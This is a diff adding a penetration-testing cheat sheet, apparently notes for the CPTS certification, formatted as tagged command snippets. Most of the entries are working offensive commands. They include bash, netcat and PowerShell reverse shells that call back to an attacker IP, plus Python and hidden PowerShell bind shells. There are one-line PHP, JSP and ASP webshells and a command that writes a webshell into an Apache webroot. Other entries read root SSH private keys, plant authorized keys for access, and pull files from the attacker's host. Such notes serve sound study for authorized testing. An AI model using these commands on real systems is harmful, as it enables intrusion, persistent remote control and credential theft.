@@ -1,0 +1,286 @@
+# CPTS
+
+% CPTS
+
+## Service scanning - banner grabbing - Getting started 
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+nc -nv <targetIP> <port>
+```
+
+## Service scanning - banner grabbing (nmap) - Getting started 
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+nmap -sV --script=banner -p<port>
+```
+
+## Service scanning - ftp connection - Getting started 
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+ftp <targetIP> <port>
+```
+
+## Service scanning - smb shares list with null session - Getting started 
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+smbclient -L -N \\\\<taretIP>
+```
+
+## Service scanning - smb shares list with user - Getting started 
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+smbclient -L -U <username> \\\\<taretIP>
+```
+
+## Web enumeration - gobuster directory enumeration - Getting started
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+gobuster dir -u <targetURL> -w <wlist>
+```
+
+## Web enumeration - technology identification w/ whatweb - Getting started
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+whatweb <targetURL>
+```
+
+## Public exploits - find public exploits searchsploit - Getting started
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+searchsploit <technology-version>
+```
+
+## Shells - revshell command linux (bash) - Getting started
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+bash -c 'bash -i >& /dev/tcp/<attackerIP>/<port> 0>&1'
+```
+
+## Shells - revshell command linux (bash 2) - Getting started
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attackerIP> <port> >/tmp/f
+```
+
+## Shells - revshell command linux (windows powershell) - Getting started
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<attackerIP>',<port>);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
+```
+
+## Shells - revshell web revshells.com - Getting started
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+firefox https://www.revshells.com/
+```
+
+## Shells - nc listener for revshell - Getting started
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+nc -lvnp <port>
+```
+
+
+## Shells - bind shell linux (bash) 0.0.0.0 - Getting started
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp <port> >/tmp/f
+```
+
+## Shells - bind shell python 0.0.0.0 - Getting started
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",<port>));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
+```
+
+## Shells - bind shell powershell 0.0.0.0 - Getting started
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]<port>; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
+```
+
+## Shells - nc bind shell connection - Getting started
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+nc <remoteHostIP> <port>
+```
+
+## Shells - upgrading TTY (python) - Getting started
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+## Shells - upgrading TTY (python) -> ctrl+z -> stty raw -echo -> fg - Getting started
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+## Shells - upgrading TTY terminal resize (extract values from our terminal) - Getting started
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+echo $TERM; stty size
+```
+
+## Shells - upgrading TTY remote terminal resize (on the target terminal) - Getting started
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+export TERM=<terminal-type>; stty rows <rows> columns <columns>
+```
+
+## Shells - php webshell - Getting started
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+<?php system($_REQUEST["cmd"]); ?>
+```
+
+## Shells - jsp webshell - Getting started
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+```
+
+## Shells - asp webshell - Getting started
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+<% eval request("cmd") %>
+```
+
+## Shells - webroots - Getting started
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+echo ""
+echo ""
+echo ""
+echo "apache -> /var/www/html"
+echo "nginx -> /usr/local/nginx/html"
+echo "iis -> c:\\inetpub\\wwwroot"
+echo "xampp -> C:\\xampp\\htdocs"
+```
+
+## Shells - cmd injection example webshell to apache webroot - Getting started
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
+```
+
+## Shells - cmd injection example webshell to apache webroot (execution) - Getting started
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+http://<targetIP-URL>:<port>/shell.php?cmd=<command>
+```
+
+## Privesc - hacktricks linux privesc checklist - Getting started
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+firefox https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html
+```
+
+## Privesc - PayloadsAllTheThings linux privesc checklist - Getting started
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+firefox https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
+```
+
+## Privesc - hacktricks windows privesc checklist - Getting started
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+firefox https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html
+```
+
+## Privesc - PayloadsAllTheThings windows privesc checklist - Getting started
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
+```
+
+## Privesc - GTFOBINS linux privesc - Getting started
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+firefox https://gtfobins.github.io/
+```
+
+## Privesc - LOLBAS windows privesc - Getting started
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+firefox https://lolbas-project.github.io/#
+```
+
+## Privesc - read crontabs - Getting started
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+ls -la /etc/crontab; ls -la /etc/cron.d; ls -la /var/spool/cron/crontabs/root 
+```
+
+## Privesc - read ssh keys (read permissions over the .ssh folder) - Getting started
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+cat /home/user/.ssh/id_rsa; cat /root/.ssh/id_rsa 
+```
+
+## Privesc - ssh connection using key - Getting started
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+chmod 600 <keyFile>; ssh <username>@<targetIP> -i <keyFile>
+```
+
+## Privesc - write ssh key to remote host (write permissions over the .ssh folder) - Getting started
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+ssh-keygen -f <fileName>; echo "copy the <fileName>.pub to the remote host (/home/user/.ssh/authorized_keys) -> then use the <fileName> to connect ssh <username>@<targetIP> -i <fileName>" 
+```
+
+## File transfers - python server - Getting started
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+ ifconfig; python3 -m http.server 1234
+```
+
+## File transfers - pull files wget - Getting started
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+ wget http://<attackerIP>:<port>/<file2pull>
+```
+
+## File transfers - pull files curl - Getting started
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+ curl http://<attackerIP>:<port>/<file2pull> -o <fileOutName>
+```
+
+## File transfers - upload with scp - Getting started
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+scp <fileName> <username>@<ip>:<outPath>
+```
+
+## File transfers - pull with scp - Getting started
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+scp <username>@<ip>:<filePath> <localPath>
+```
+
+## File transfers - base64 - Getting started
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+base64 <fileName> -w 0
+```
+
+## File transfers - base64 - Getting started
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+echo "base64here" | base64 -d > <outFileName>
+```
+
+## File transfers - validating file transfer file - Getting started
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+file <fileName>
+```
+
+## File transfers - validating file transfer hash - Getting started
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+md5sum <fileName>
+```
